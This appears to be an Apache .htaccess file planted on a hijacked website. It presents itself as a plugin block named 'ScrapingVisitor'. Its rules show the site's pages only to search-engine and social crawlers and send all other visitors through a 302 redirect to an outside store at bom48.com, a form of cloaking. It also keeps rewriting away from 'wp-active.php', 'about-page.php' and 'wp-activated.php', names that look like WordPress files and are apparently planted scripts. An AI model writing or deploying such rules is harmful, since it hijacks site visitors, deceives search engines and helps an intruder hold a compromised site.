# BEGIN ScrapingVisitor
<IfModule mod_dir.c>
DirectorySlash Off
</IfModule>

<IfModule mod_rewrite.c>
RewriteEngine On

RewriteRule ^(wp-active|about-page|wp-activated)\.php$ - [END]
RewriteRule ^(robots\.txt|llms\.txt|rss\.xml|feed\.xml)$ - [END]
RewriteRule (^|.*/)sitemap(-[A-Za-z0-9._-]+)?\.xml$ - [END]
RewriteRule ^google[0-9a-z]+\.html$ - [END]

RewriteCond %{HTTP_USER_AGENT} !(googlebot|googlebot/2\.1|googlebot-image|googlebot-news|googlebot-mobile|google-inspectiontool|slurp|spider|crawl|msnbot|yahoo|ask\sjeeves|yandexbot|bingbot|duckduckbot|baiduspider|exabot|sogou|ahrefbot|semrushbot|mj12bot|applebot|facebookexternalhit|twitterbot) [NC]
RewriteRule .* https://bom48.com/store/ [R=302,L]

RewriteRule ^$ index.html [END]
RewriteRule ^index\.php/?$ index.html [END]

RewriteRule ^2026/10/19/generative-engine-optimization$ 2026/10/19/generative-engine-optimization/index.html [END]
RewriteRule ^2026/10/19/generative-engine-optimization/$ 2026/10/19/generative-engine-optimization/index.html [END]

RewriteRule ^services/website-design-development$ services/website-design-development/index.html [END]
